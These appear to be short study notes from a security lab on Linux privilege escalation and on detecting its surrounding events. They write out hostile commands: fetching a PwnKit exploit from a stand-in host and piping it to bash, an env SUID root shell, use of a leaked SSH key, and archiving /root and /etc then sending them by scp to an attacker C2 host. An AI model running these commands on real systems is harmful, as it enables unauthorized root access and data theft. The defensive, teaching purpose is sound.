- Insufficient privileges are an obstacle for attackers 
- And exploits usually start at a low privilege service users 
- These users are sometimes restricted to a single folder 
- No ability to execute 
- No ability to download 

That's why attackers need privilege escalation 

# Techniques to get to the root user 

Tied to discovery and its vulnerabilities 

```
uname -a -> shows an unpatched ubuntu

Run exploit like Pwnkit: wget http://bad.thm/pwnkit.sh | bash 
```

```
find /bin -perm 4000 detects an env with a SUID flag

SUID vulnerability to get root access: /bin/env /bin/bash -p
```

```
ls /etc/ssh -> shows an unprotected key or backup key 

Try to use the file via ssh: ssh name@ip -i ssh-backup-key
```


# How do we detect privilege escalation

1. It's hard since there are hundreds of SUID misconfigs 
2. Thousands of software vulnerabilities 


So a more universal approach would be to detect surrounding events: 
```
Detection 1: Spike of Discovery Commands
whoami
id; pwd; ls -la; crontab -l
ps aux | egrep "edr|splunk|elastic"
uname -r

Detection 2: A download to a /tmp folder
wget http://bad.thm/pwnkit.c -0 /tmp/pwnkit.c
gcc /tmp/pwnkit.c -o /tmp/pwnkit
chmod +x /tmp/pwnkit
/tmp/pwnkit

Detection 3: Data exfiltration with SCP, can check sshd for this 
whoami
tar czf dump.tar.gz /root /etc/
scp dump.tar.gz attacker@c2-server.thm  
```
